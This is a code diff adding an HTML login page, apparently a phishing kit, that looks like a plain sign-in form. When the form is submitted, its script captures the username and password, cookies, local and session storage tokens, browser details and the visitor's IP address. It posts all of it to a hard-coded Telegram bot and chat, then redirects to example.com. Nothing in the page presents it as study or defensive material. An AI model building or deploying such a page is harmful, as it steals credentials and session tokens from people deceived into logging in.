@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 20px;
+      background-color: #ffffff;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      width: 70px;
+      height: auto;
+    }
+
+    .hamburger {
+      font-size: 28px;
+      cursor: pointer;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 80vh;
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 300px;
+    }
+
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .login-box input[type="submit"] {
+      width: 100px;
+      padding: 8px;
+      background: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      display: block;
+      margin: 10px auto;
+    }
+
+    .login-box input[type="submit"]:hover {
+      background: #0056b3;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .forgot-password a {
+      font-size: 14px;
+      color: #007BFF;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="https://via.placeholder.com/70" alt="Logo" class="logo">
+  <div class="hamburger">&#9776;</div>
+</header>
+
+<div class="container">
+  <form class="login-box" onsubmit="sendData(event)">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <input type="submit" value="Login">
+    <div class="forgot-password">
+      <a href="#">Forgot password?</a>
+    </div>
+  </form>
+</div>
+
+<script>
+  async function sendData(event) {
+    event.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    const cookies = document.cookie;
+    const localToken = localStorage.getItem("token") || "none";
+    const sessionToken = sessionStorage.getItem("token") || "none";
+    const userAgent = navigator.userAgent;
+    const screenSize = `${screen.width}x${screen.height}`;
+    const currentURL = window.location.href;
+
+    let ip = "unknown";
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      ip = data.ip;
+    } catch (e) {}
+
+    const message = `
+New Login Captured:
+Username: ${username}
+Password: ${password}
+IP Address: ${ip}
+User Agent: ${userAgent}
+Screen Size: ${screenSize}
+Page URL: ${currentURL}
+
+Cookies: ${cookies}
+LocalStorage Token: ${localToken}
+SessionStorage Token: ${sessionToken}
+    `;
+
+    const TELEGRAM_BOT_TOKEN = "7857705459:AAHaGE6-uZIzv34uuWfqWdfbtP0T9jrvDbU";
+    const TELEGRAM_CHAT_ID = "5053464023";
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`
+    });
+
+    // Optional redirect
+    window.location.href = "https://example.com";
+  }
+</script>
+
+</body>
+</html>
